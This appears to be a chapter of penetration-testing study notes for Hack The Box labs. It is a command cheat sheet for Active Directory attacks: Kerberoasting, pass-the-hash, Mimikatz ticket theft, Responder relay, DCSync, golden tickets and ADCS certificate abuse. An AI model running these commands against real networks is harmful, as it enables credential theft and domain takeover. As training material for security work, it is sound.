# 13 — Active Directory Attacks

## Kerberoasting (crack SPN-set service account passwords offline)

```bash
# From Linux with valid creds
impacket-GetUserSPNs target.local/user:pass -dc-ip <IP> -request

# Save hashes then crack
hashcat -m 13100 hashes.txt rockyou.txt

# From Windows
Invoke-Kerberoast -OutputFormat Hashcat | Out-File hashes.txt
```

## AS-REP Roasting (users with Kerberos pre-auth disabled)

```bash
impacket-GetNPUsers target.local/ -usersfile users.txt -no-pass -dc-ip <IP> -format hashcat
hashcat -m 18200 hashes.txt rockyou.txt
```

## Pass-the-Hash (PtH)

```bash
nxc smb <IP> -u user -H <NTLM_hash>
impacket-psexec -hashes :<NTLM_hash> user@<IP>
evil-winrm -i <IP> -u user -H <NTLM_hash>
```

## Overpass-the-Hash / Pass-the-Ticket

```bash
# Overpass-the-hash: get a TGT using NTLM hash, then act as full Kerberos
impacket-getTGT target.local/user -hashes :<NTLM_hash>
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass target.local/user@<hostname>

# Pass-the-Ticket with Mimikatz (Windows)
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt ticket.kirbi
```

## LLMNR/NBT-NS Poisoning (capture NetNTLMv2 hashes on the wire)

```bash
responder -I tun0 -wrf
# Crack captured hashes
hashcat -m 5600 hash.txt rockyou.txt
```
**If cracking fails or hash is used for relay instead:**
```bash
# NTLM Relay (when SMB signing is disabled on targets)
ntlmrelayx.py -tf targets.txt -smb2support
responder -I tun0 -wrf   # forces auth attempts, relay tool catches them
```

## DCSync (dump all domain hashes if you have Replication rights)

```bash
impacket-secretsdump target.local/user:pass@<DC_IP>
# or with mimikatz on a DC:
mimikatz # lsadump::dcsync /domain:target.local /user:krbtgt
```

## Golden / Silver Ticket

```bash
# Golden ticket - full domain persistence, requires krbtgt hash
impacket-ticketer -nthash <krbtgt_NTLM> -domain-sid <SID> -domain target.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass target.local/Administrator@<DC>

# Silver ticket - forge TGS for a specific service, requires service account hash
impacket-ticketer -nthash <svc_hash> -domain-sid <SID> -domain target.local -spn cifs/dc01.target.local Administrator
```

## Unconstrained / Constrained Delegation Abuse

```bash
# Find delegation misconfigs via BloodHound edges: AllowedToDelegate, unconstrained delegation flag
# Constrained delegation abuse (S4U2Self/S4U2Proxy)
impacket-getST -spn cifs/target-host.target.local -impersonate Administrator target.local/svc_account:pass
```

## ACL Abuse (GenericAll / WriteDACL / ForceChangePassword — found via BloodHound)

```bash
# GenericAll on a user -> reset their password
impacket-changepasswd target.local/victim@<DC> -newpass 'Newpass123!' -altuser attacker -altpass pass

# GenericAll on a group -> add yourself
net rpc group addmem "Domain Admins" attacker -U target.local/user%pass -S <DC_IP>

# WriteDACL -> grant yourself DCSync rights, then DCSync (via PowerView / impacket)
```

## Certificate Services Abuse (ADCS / ESC1-ESC8)

```bash
certipy-ad find -u user -p pass -dc-ip <IP> -vulnerable
# ESC1 example: request a cert as Administrator via a misconfigured template
certipy-ad req -u user -p pass -ca 'CA-NAME' -target <CA_IP> -template VulnTemplate -upn administrator@target.local
certipy-ad auth -pfx administrator.pfx -dc-ip <IP>
```
**Worth learning even if HTB Academy AD modules under-emphasize it** — ADCS misconfigs are common in real exams/networks and `certipy-ad` is the go-to modern tool.

## Quick Reference — Tools In This File

| Task | HTB-taught | Faster/better alternative |
|---|---|---|
| Kerberoast/ASREPRoast | impacket scripts (correct, keep using) | same — impacket is the standard here |
| Ticket ops (PtT, Golden/Silver) | Mimikatz (Windows-only) | `impacket-ticketer`/`getTGT`/`getST` work from Linux, no Windows needed |
| ADCS abuse | often light coverage in Academy | `certipy-ad` — check this on every AD box, ESC1 is very common |
| Relay attacks | Responder alone | Responder + `ntlmrelayx.py` combo |

Next: `14-lateral-movement.md`
